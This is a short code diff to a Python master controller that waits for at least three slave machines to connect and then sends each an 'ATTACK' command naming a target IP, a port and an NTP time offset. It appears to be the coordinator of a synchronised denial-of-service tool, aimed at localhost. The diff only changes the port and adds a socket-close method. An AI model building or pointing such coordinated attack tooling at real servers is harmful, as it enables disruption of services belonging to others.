@@ -12,7 +12,7 @@ class Master():
 
     # The server to be attacked
     self.server_ip = 'localhost'
-    self.server_port = 8020
+    self.server_port = 8080
 
     # get ntp times
     self.ntpc = ntplib.NTPClient()
@@ -40,6 +40,9 @@ class Master():
     for slave_addr, conn in self.slaves.iteritems():
       conn.send('ATTACK {0} {1} {2}'.format(self.server_ip, self.server_port, ntp_res.offset))
 
+  def closeConnection(self):
+    self.sock.close()
+
 if __name__ == '__main__':
     port = 8081
     masterServer = Master()
@@ -49,3 +52,4 @@ if __name__ == '__main__':
       if len(masterServer.slaves) >= 3:
         break
     masterServer.launchAttack()
+    masterServer.closeConnection()
